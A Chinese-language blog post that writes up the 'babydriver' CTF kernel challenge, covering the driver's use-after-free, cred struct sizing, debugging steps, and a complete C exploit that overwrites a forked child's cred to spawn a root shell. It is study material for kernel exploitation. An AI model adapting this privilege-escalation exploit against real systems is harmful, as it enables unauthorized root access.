---
layout: post
title: "[kernel pwn]babydriver"
date: 2019-09-23
categories: jekyll update
---

### [kernel pwn]babydriver

参考文章：
+ https://www.anquanke.com/post/id/86490
+ 多个kernel pwn例子讲解： https://sunichi.github.io/2019/04/29/how-to-ret2usr/
+ 利用详细过程：http://pwn4.fun/2017/08/15/Linux-Kernel-UAF/


### 拿到题目如何操作

一般会有三个文件：

1. boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关
2. bzImage: kernel binary
3. rootfs.cpio: 文件系统映像(根文件的映像)

所以先新建一个文件夹，然后解压文件系统映像
```
mkdir fs
cd fs
cp ../rootfs.cpio ./
mv rootfs.cpio rootfs.cpio.gz # 需要先解压文件
gunzip rootfs.cpio.gz
cpio -idmv < rootfs.cpio 
// 解包完成，可以向目录中添加文件
find . | cpio -o --format=newc > ../rootfs.cpio
// 重新打包，不需要压缩也可以
```

然后查看init文件的内容，可以知道babydriver.ko就是我们需要分析的漏洞驱动，将它用ida打开
```
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

分析babydriver.ko

```
//释放babydev_struct
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n");
  return 0;
}

//申请一块大小为 0x40 字节的空间，地址存储在全局变量babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len
int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL);
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n");
  return 0;
}

//定义了 0x10001 的命令，可以释放全局变量 babydev_struct中的device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 result; // rax

  _fentry__(filp, *(_QWORD *)&command);
  v4 = v3;
  if ( command == 65537 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n");
    result = 0LL;
  }
  else
  {
    printk(&unk_2EB);
    result = -22LL;
  }
  return result;
}

//从 buffer 拷贝到全局变量中
ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();
    result = v6;
  }
  return result;
}

//从全局变量拷贝到 buffer 中
ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);
    result = v6;
  }
  return result;
}
```

**关于copy_from_user和copy_to_user**
参考：
+ https://blog.csdn.net/ce123_zhouwei/article/details/8454226
+ https://blog.csdn.net/linxi_hnh/article/details/8076703

这里用copy_from_user举了例子:

在学习Linux内核驱动的时候，经常会碰到copy_from_user和copy_to_user这两个函数，设备驱动程序中的ioctl函数就经常会用到。这两个函数负责在用户空间和内核空间传递数据。首先看看它们的定义(linux/include/asm-arm/uaccess.h)，先看copy_from_user：

```
static inline unsigned long copy_from_user(void *to, const void __user *from, unsigned long n)
{
	if (access_ok(VERIFY_READ, from, n))
		n = __arch_copy_from_user(to, from, n);
	else /* security hole - plug it */
		memzero(to, n);
	return n;
}
```
先看函数的三个参数：*to是内核空间的指针，*from是用户空间指针，n表示从用户空间想内核空间拷贝数据的字节数。如果成功执行拷贝操作，则返回0，否则返回还没有完成拷贝的字节数。

这个函数从结构上来分析，其实都可以分为两个部分：
1. 首先检查用户空间的地址指针是否有效；
2. 调用__arch_copy_from_user函数。

**回归正题，先说利用思路：**

由于baby_struct.device是全局的，因此只能存在一个，所以当我们open 2个设备的时候，第二次open的会覆盖第一次的，我们再释放第一次打开的，这时候第二次打开的设备也会被释放，就存在UAF，然后通过ioctl改变大小，使得和cred结构大小一样再fork一个进程，它的cred结构体被放进这个UAF的空间，然后我们能够控制这个cred结构体，通过write写入uid，达到getshell。

**为什么控制cred结构体就能提权？**

一个进程的权限是由cred结构体中的uid决定的，每个进程中都有一个cred结构体，并且保存了该进程的权限信息，如果能修改cred信息，就可以进行提权。

**为什么会覆盖形成UAF？**

主要是关于slub分配器的了解，相同大小的内存块放在一起。

于是思路就是：现在有一个UAF，将某个进程的cred结构体放进这个UAF内存空间，然后就可以控制这个cred结构体。

首先我们需要知道cred结构体的大小，才能控制该结构体
方法一是查看源码

```
struct cred {
	atomic_t	usage; 4
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */ 4
	kgid_t		gid;		/* real GID of the task */ 4
	kuid_t		suid;		/* saved UID of the task */ 4
	kgid_t		sgid;		/* saved GID of the task */ 4
	kuid_t		euid;		/* effective UID of the task */ 4
	kgid_t		egid;		/* effective GID of the task */ 4
	kuid_t		fsuid;		/* UID for VFS ops */ 4
	kgid_t		fsgid;		/* GID for VFS ops */ 4
	unsigned	securebits;	/* SUID-less security management */ 4
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */ 4  
	kernel_cap_t	cap_permitted;	/* caps we're permitted */ 4
	kernel_cap_t	cap_effective;	/* caps we can actually use */ 4
	kernel_cap_t	cap_bset;	/* capability bounding set */ 4
	kernel_cap_t	cap_ambient;	/* Ambient capability set */ 4
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested 
					 * keys to */ 1
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */ 8
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```

方法二是自己写个简单modules然后printf一下sizeof(struct cred)就能知道了

```
//简单modules  calc_cred.c 
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
MODULE_LICENSE("Dual BSD/GPL");
struct cred c1;
static int hello_init(void) 
{
    printk("<1> Hello world!\n");
    printk("size of cred : %d \n",sizeof(c1));
    return 0;
}
static void hello_exit(void) 
{
    printk("<1> Bye, cruel world\n");
}
module_init(hello_init);
module_exit(hello_exit);
```

这里内核模块编译，如果出现缺少Linux kernel头文件

To install just the headers in Ubuntu:
`sudo apt-get install linux-headers-$(uname -r)`
To install the entire Linux kernel source in Ubuntu:
`sudo apt-get install linux-source`

Note that you should use the kernel headers that match the kernel you are running.

`====================================`

**如何编译内核模块：**

编写MakeFile ：

```
# at first type on ur terminal that $(uname -r) then u will get the version..
# that is using on ur system

obj-m += calc_cred.o

KDIR =/usr/src/linux-headers-$(shell uname -r)

all:
        $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules

clean:
        rm -rf *.o *.ko *.mod.* *.symvers *.order
```

然后命令行执行：

1. make
2. sudo insmod calc_cred.ko
3. dmesg
4. sudo rmmod calc_cred
5. make clean

`====================================`

然后根据上面的思路写出exp：

```
//gcc exp.c -static -o exp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
int main()
{
	int fd1 = open("/dev/babydev",2);
	int fd2 = open("/dev/babydev",2);

	ioctl(fd1,65537,0xa8);

	close(fd1);

	int pid = fork();

	if(pid < 0)
	{
		puts("[*] fork error!");
		exit(0);
	}

	else if (pid == 0)
	{
		int buf[9]={0};
        write(fd2,buf,28);
        system("/bin/sh");
	}

	else
	{
		wait(NULL);
	}

	return 0;

}
```

编译：`gcc exp.c -static -o exp`

静态编译exp，并将编译好的exp放入解压的fs目录下，重新打包fs系统

`find . | cpio -o --format=newc > rootfs.cpio`

替换rootfs.cpio后启动程序`./boot.sh`

如何启动的时候提示:

```
Could not access KVM kernel module: No such file or directory
qemu-system-x86_64: failed to initialize KVM: No such file or directory
```

​ 解决方法：虚拟机关机后在虚拟机高级设置里打开关于cpu虚拟化的选项(设置->处理器->开启“虚拟化Inter VT-x/EPT”)

然后再运行一次`./boot.sh`，然后运行`./exploit`就getshell了。

**关于调试**

首先在qemu的启动内核脚本中加上`-gdb tcp::1234`选项，启动`./boot.sh`，

为了调试内核模块，还需要加载 驱动的 符号文件，首先在系统里面获取驱动的加载基地址

启动内核后，可以通过`lsmod`查看驱动的加载基地址
```
/ $ lsmod
babydriver 16384 0 - Live 0xffffffffc0000000 (OE)
```

然后gdb中加载符号文件：

```
add-symbol-file /home/zoe/Desktop/ctf-challenge/2017CISCN_babydriver/babydriver.ko 0xffffffffc0000000
```

然后下断点`b babyioctl`，再跑`./exploit`就断下来了

终于成功了！

<img src="/images/posts/kernel_pwn/babydriver/1569223834939.png" >


